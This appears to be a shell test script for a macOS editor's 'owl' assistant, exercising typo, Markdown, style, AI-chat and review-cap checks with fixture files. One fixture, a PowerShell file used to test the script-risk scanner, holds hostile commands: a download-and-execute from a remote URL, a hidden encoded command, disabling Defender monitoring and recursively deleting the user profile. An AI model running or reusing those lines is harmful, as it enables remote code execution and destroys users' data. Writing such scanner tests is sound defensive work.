#!/bin/bash
# The owl's in-process check (OwlCheck.swift), light and dark: opens a
# one-line JSON file with the owl on, waits for "Format it?", clicks Apply,
# checks one ⌘Z undoes it, types near the owl, saves. Then the newer rules
# (OwlRulesCheck.swift): types a to-do list, a doubled word and merge
# markers into a text file and answers each hint (Fix it, Show Me); a
# Markdown file's broken link gets its nearest file (Fix it, one ⌘Z); the
# typo offer on the owl's pause (OwlTypoCheck.swift: an opened diary, a
# log that gets none, an email typed key by key); and,
# with a fake AI and automatic checks off (Intel's default), checks that
# typing never asks the AI and "Ask AI Now" does; and that files opened
# while Ask Cedric is key never become tabs of the panel. Recent hints in
# the popover show a hint again (OwlHistoryCapCheck.swift), and a log over
# the auto-review cap is never checked on its own: a quiet note, and Ask AI
# Now only after a confirmation. With the built-in engine (a spy, never
# llama.cpp), opening and idling never load the model (BuiltInGateCheck).
# Snapshots go to the directory given
# (default: a temp dir) for a look; CEDRIC_OWL_CHECK_SHOTS=dir also copies
# the recent-hint and cap snapshots there.
#
#   Scripts/owl-check.sh [out-dir]
set -euo pipefail
cd "$(dirname "$0")/.."
swift build --product CedricApp >/dev/null
BIN=$(swift build --show-bin-path)/CedricApp
OUT=${1:-$(mktemp -d -t cedric-owl-check)}
WORK=$(mktemp -d -t cedric-owl-work)
trap 'rm -rf "$WORK"' EXIT
status=0
for theme in light dark; do
    printf '{"name":"Cedric","kind":"owl","monocle":true,"hints":["json","tabs",{"crlf":null}],"empty":{},"list":[],"n":42}\n' > "$WORK/sample-$theme.json"
    CEDRIC_SESSION_DIR="$WORK/session-$theme" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
    CEDRIC_OPEN="$WORK/sample-$theme.json" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_THEME=$theme \
    CEDRIC_SNAPSHOT_SIZE=760x330 CEDRIC_OWL_CHECK="$OUT/$theme" "$BIN" || status=1
done
printf 'Todo\n' > "$WORK/todo.txt"
CEDRIC_SESSION_DIR="$WORK/session-rules" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/todo.txt" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_PAUSE=0.5 CEDRIC_OWL_INTERVAL=1 \
CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/rules" CEDRIC_OWL_CHECK_RULES=1 "$BIN" || status=1
# Markdown's writing checks (OwlRulesCheck.runMarkdown): a broken link
# next to a similarly named file; Fix it links the nearest one; one ⌘Z.
mkdir -p "$WORK/md/docs"
printf '# Guide\n' > "$WORK/md/docs/guide.md"
printf '# Notes\n\nSee [the guide](docs/gide.md#setup) first.\n' > "$WORK/md/notes.md"
CEDRIC_SESSION_DIR="$WORK/session-md" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/md/notes.md" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_PAUSE=0.5 CEDRIC_OWL_INTERVAL=1 \
CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/markdown" CEDRIC_OWL_CHECK_RULES=markdown "$BIN" || status=1
# Style Check (OwlRulesCheck.runStyle): a redundancy fixed and undone, a
# typed filler ignored; the code block's word never flagged.
printf '# Notes\n\nThe past history is long.\n\n```\nlet very = 1\n```\n' > "$WORK/md/style.md"
CEDRIC_SESSION_DIR="$WORK/session-style" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/md/style.md" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_PAUSE=0.5 CEDRIC_OWL_INTERVAL=1 CEDRIC_STYLE_CHECK=1 \
CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/style" CEDRIC_OWL_CHECK_RULES=style "$BIN" || status=1
# Typos on the owl's schedule: an opened diary, a log, typing an email.
printf 'Monday\n\nToday I walked to the shop agian and ofcourse it was closed. It definately rains too much here, and shes not happy about it.\nTomorrow I will try agian.\n' > "$WORK/diary.txt"
for i in 1 2 3 4 5 6 7 8; do printf '2026-11-18T10:00:0%sZ INFO recieved request id=%s dur=0ms statsu=200  \n' $i $i; done > "$WORK/server.log"
: > "$WORK/email.txt"
CEDRIC_SESSION_DIR="$WORK/session-typos" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/diary.txt" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_PAUSE=1.6 CEDRIC_OWL_INTERVAL=1 CEDRIC_TYPO_INTERVAL=0 \
CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/typos" CEDRIC_OWL_CHECK_TYPOS=1 "$BIN" || status=1
printf 'func total(_ items: [Int]) -> Int {\n    var t = 0\n    for i in 0...items.count { t += i }\n    return t\n}\n' > "$WORK/Total.swift"
SUITE="cedric-owl-check-$$"
CEDRIC_SESSION_DIR="$WORK/session-ai" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/Total.swift" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_SOURCE=rulesAndAI \
CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_AI_AUTO=0 CEDRIC_AI_PAUSE=0.2 CEDRIC_AI_MIN_IDLE=0.2 CEDRIC_AI_INTERVAL=0.2 \
CEDRIC_AI_DEFAULTS="$SUITE" CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/ai" CEDRIC_OWL_CHECK_AI=1 "$BIN" || status=1
# Ask Cedric (OwlChatCheck.swift): the panel, a streamed answer, tools
# and a proposed edit applied as one undo step, a stale proposal, Stop.
printf 'func total(_ items: [Int]) -> Int {\n    var t = 0\n    for i in items { t += i }\n    return t\n}\n' > "$WORK/Sum.swift"
CEDRIC_SESSION_DIR="$WORK/session-chat" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/Sum.swift" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_CHAT=1 CEDRIC_OWL_TOOLS=1 \
CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_OWL_CHAT_FAKE_DELAY=0.12 CEDRIC_AI_AUTO=0 CEDRIC_AI_DEFAULTS="$SUITE" \
CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/chat" CEDRIC_OWL_CHECK_CHAT=1 "$BIN" || status=1
# Ask Cedric's default follows the engine: off with none ready
# (CEDRIC_ASK_ENGINE=0; the owl offers to set one up), on with one (the
# fake), where the owl's first item is Ask about this file… and the
# one-time hint shows. No CEDRIC_OWL_CHAT, owlChat never set (the checks
# fail if it was).
env -u CEDRIC_OWL_CHAT CEDRIC_SESSION_DIR="$WORK/session-chat-off" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/Sum.swift" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_ASK_ENGINE=0 \
CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_AI_AUTO=0 CEDRIC_AI_DEFAULTS="$SUITE" \
CEDRIC_OWL_CHECK="$OUT/chat-off" CEDRIC_OWL_CHECK_CHAT_OFF=1 "$BIN" || status=1
env -u CEDRIC_OWL_CHAT CEDRIC_SESSION_DIR="$WORK/session-chat-on" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/Sum.swift" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_ASK_HINT=1 CEDRIC_ASK_HINT_AFTER=0.5 \
CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_OWL_CHAT_FAKE_DELAY=0.05 CEDRIC_AI_AUTO=0 CEDRIC_AI_DEFAULTS="$SUITE" \
CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/chat-on" CEDRIC_OWL_CHECK_CHAT=default "$BIN" || status=1
# Check Script for Risks… on a risky PowerShell script: with the fake
# AI, then with Ask Cedric off (the offline scan alone).
cat > "$WORK/setup.ps1" <<'PS1'
# Sets up the tools
Set-ExecutionPolicy Bypass -Scope Process -Force
iex (New-Object Net.WebClient).DownloadString('https://example.com/install.ps1')
powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=
Set-MpPreference -DisableRealtimeMonitoring $true
Remove-Item -Path "$env:USERPROFILE\*" -Recurse -Force
Write-Host "Done"
PS1
for chat in 1 0; do
    CEDRIC_SESSION_DIR="$WORK/session-script-$chat" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
    CEDRIC_OPEN="$WORK/setup.ps1" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_CHAT=$chat \
    CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_OWL_CHAT_FAKE_DELAY=0.05 CEDRIC_AI_AUTO=0 CEDRIC_AI_DEFAULTS="$SUITE" \
    CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/script-$chat" CEDRIC_OWL_CHECK_CHAT=script "$BIN" || status=1
done
# Files opened while Ask Cedric (then Settings) is the key window land in
# the document window's tab group, never as tabs of the panel
# (PanelTabsCheck.swift): a text file, a PDF and a .md through
# application(_:open:), Reopen Closed Tab, and with every document window
# minimized.
CEDRIC_SESSION_DIR="$WORK/session-panel-tabs" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/Sum.swift" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_CHAT=1 \
CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_AI_AUTO=0 CEDRIC_AI_DEFAULTS="$SUITE" \
CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/panel-tabs" CEDRIC_OWL_CHECK_CHAT=panel-tabs "$BIN" || status=1
# Ask Cedric about an SVG (OwlPictureCheck.swift): "What is it a picture
# of?" calls describe_image even with tools gated off; the preview's
# renderer draws it, Apple Vision reads it, the answer quotes it.
cat > "$WORK/binoculars.svg" <<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" width="53" height="53" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
  <path d="M10 10h4"/><path d="M19 7V4a1 1 0 0 0-1-1h-2a1 1 0 0 0-1 1v3"/>
  <path d="M20 21a2 2 0 0 0 2-2v-3.851c0-1.39-2-2.962-2-4.829V8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v11a2 2 0 0 0 2 2z"/>
  <path d="M22 16H2"/><path d="M4 21a2 2 0 0 1-2-2v-3.851c0-1.39 2-2.962 2-4.829V8a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v11a2 2 0 0 1-2 2z"/>
  <path d="M9 7V4a1 1 0 0 0-1-1H6a1 1 0 0 0-1 1v3"/>
</svg>
SVG
CEDRIC_SESSION_DIR="$WORK/session-picture" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/binoculars.svg" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_CHAT=1 CEDRIC_OWL_TOOLS=0 \
CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_OWL_CHAT_FAKE_DELAY=0.05 CEDRIC_AI_AUTO=0 CEDRIC_AI_DEFAULTS="$SUITE" \
CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/picture" CEDRIC_OWL_CHECK_CHAT=picture "$BIN" || status=1
# Check Grammar with Cedric (fake engine) on a letter.
printf 'Dear Sam,\n\nThe trip took longer then I expected, but the weather was kind to us and the views were lovely. We will send photos when we are home again next week.\n\nBest wishes,\nAlex\n' > "$WORK/letter.txt"
CEDRIC_SESSION_DIR="$WORK/session-grammar-ai" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/letter.txt" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_CHAT=1 CEDRIC_GRAMMAR_FAKE=1 CEDRIC_GRAMMAR_PAUSE=0.3 \
CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_AI_AUTO=0 CEDRIC_AI_DEFAULTS="$SUITE" \
CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/grammar-ai" CEDRIC_OWL_CHECK_CHAT=grammar "$BIN" || status=1
# Recent hints, selectable (OwlHistoryCapCheck.runHistory): a doubled word,
# shown again from the popover by a click, then by Return once stale.
printf 'Fix the the bug.\n' > "$WORK/history.txt"
CEDRIC_SESSION_DIR="$WORK/session-history" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/history.txt" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_PAUSE=0.5 CEDRIC_OWL_INTERVAL=1 \
CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/history" CEDRIC_OWL_CHECK_HISTORY=1 "$BIN" || status=1
# The auto-review cap (OwlHistoryCapCheck.runCap): a 6,132-line log of
# about 730 KB, like the one that froze a Mac, with automatic AI checks on.
awk 'BEGIN { for (i = 1; i <= 6132; i++) printf "[2026-11-20 03:%02d:%02d] [INFO] [agent] pwnagotchi: channel %2d, %4d aps, waiting for handshakes on wlan0mon %06d ......\n", (i/60)%60, i%60, i%14, i%977, i }' > "$WORK/pwnagotchi.log"
CEDRIC_SESSION_DIR="$WORK/session-cap" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/pwnagotchi.log" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_SOURCE=rulesAndAI CEDRIC_OWL_PAUSE=0.5 CEDRIC_OWL_INTERVAL=1 \
CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_AI_AUTO=1 CEDRIC_AI_PAUSE=0.2 CEDRIC_AI_MIN_IDLE=0.2 CEDRIC_AI_INTERVAL=0.2 \
CEDRIC_AI_DEFAULTS="$SUITE" CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/cap" CEDRIC_OWL_CHECK_CAP=1 "$BIN" || status=1
# The freeze path (BuiltInGateCheck.swift): Built-in, automatic checks on,
# Rules + AI, Load model at launch off. Opening, typing and idling load
# nothing; Ask AI Now loads once; the watchdog's notice; the setting.
# CEDRIC_BUILTIN_SPY=1: a spy instead of llama.cpp (never a real model),
# and a stand-in "installed" default model in a temp models dir.
MODELS="$WORK/models"
mkdir -p "$MODELS"
read -r MFILE MSIZE MSHA < <(python3 -I -c 'import json,sys; m=[x for x in json.load(open(sys.argv[1]))["models"] if x.get("isDefault")][0]; print(m["fileName"], m["sizeBytes"], m["sha256"])' Resources/AI/models.json)
mkfile -n "$MSIZE" "$MODELS/$MFILE"
printf '%s\n' "$MSHA" > "$MODELS/$MFILE.verified"
printf 'func total(_ items: [Int]) -> Int {\n    var t = 0\n    for i in items { t += i }\n    return t\n}\n' > "$WORK/Gate.swift"
CEDRIC_SESSION_DIR="$WORK/session-builtin" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
CEDRIC_OPEN="$WORK/Gate.swift" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_SOURCE=rulesAndAI CEDRIC_OWL_PAUSE=0.5 CEDRIC_OWL_INTERVAL=1 \
CEDRIC_AI=1 CEDRIC_AI_BACKEND=builtIn CEDRIC_AI_AUTO=1 CEDRIC_AI_PAUSE=0.5 CEDRIC_AI_MIN_IDLE=1 CEDRIC_AI_INTERVAL=1 \
CEDRIC_BUILTIN_SPY=1 CEDRIC_MODELS_DIR="$MODELS" \
CEDRIC_AI_DEFAULTS="$SUITE" CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/builtin" CEDRIC_OWL_CHECK_BUILTIN=1 "$BIN" || status=1
defaults delete "$SUITE" >/dev/null 2>&1 || true
rm -f "$HOME/Library/Preferences/$SUITE.plist"
echo "owl-check: snapshots in $OUT"
exit $status
